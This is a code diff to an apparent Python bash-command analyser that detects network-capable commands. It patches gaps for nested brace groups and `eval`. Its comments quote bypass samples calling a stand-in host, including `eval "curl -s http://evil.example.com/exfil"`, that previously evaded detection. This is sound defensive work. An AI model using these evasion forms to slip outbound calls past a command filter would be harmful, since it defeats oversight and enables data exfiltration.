@@ -960,6 +960,17 @@ def _looks_network_capable(text):
     for sub in nested:
         if _looks_network_capable(sub):
             return True
+    # Card 7e01b349 (RedHat NO-GO on 80c80706, F1b): a bare brace group NESTED INSIDE a function
+    # body -- `f() { { curl "$1"; }; }` -- was invisible here. The body text handed in is
+    # `{ curl "$1"; }`; tokenize() has no separator for `{`, so its own "command name" reads as
+    # the literal word "{" (see _find_bare_brace_group_bodies's own docstring for why that is true
+    # of this tokenizer generally), and the curl behind it was never reached by the segment loop
+    # above. Measured pre-fix: `f() { { curl "$1"; }; }; f https://evil.example.com/k` passed with
+    # zero findings. Reusing the dedicated bare-group finder (already proven correct for the
+    # top-level/nested-substitution case in analyse()) closes the same gap here.
+    for brace_body in _find_bare_brace_group_bodies(text):
+        if _looks_network_capable(brace_body):
+            return True
     return False
 
 
@@ -1095,6 +1106,18 @@ def _judge_segment_body(seg, allowed, findings, depth, hatch=None):
         return
     if name in DIRECT_NET:
         _judge_hostport_command(name, seg, idx, allowed, findings)
+        return
+    if name == "eval":
+        # Card 7e01b349 (RedHat NO-GO on 80c80706, F1b): `eval` was not handled at all -- its
+        # operand is bash CODE (eval concatenates its arguments with a space and executes the
+        # result), so `eval "curl -s http://evil.example.com/exfil"` and
+        # `eval '{ curl -s http://evil.example.com/exfil; }'` both passed with zero findings,
+        # same as `bash -c` would have if SHELLS didn't special-case it (see that branch below).
+        # Fixed the same way: hand the joined operand text back into analyse() at depth+1, so a
+        # bare-group curl inside the eval'd string is also caught by that recursive pass.
+        parts = [w.text for w in seg[idx + 1:] if not w.redirect]
+        if parts:
+            findings.extend(analyse(" ".join(parts), allowed, depth=depth + 1, hatch=hatch))
         return
     if name in INTERPRETERS:
         script = _interpreter_script(seg, idx, name)
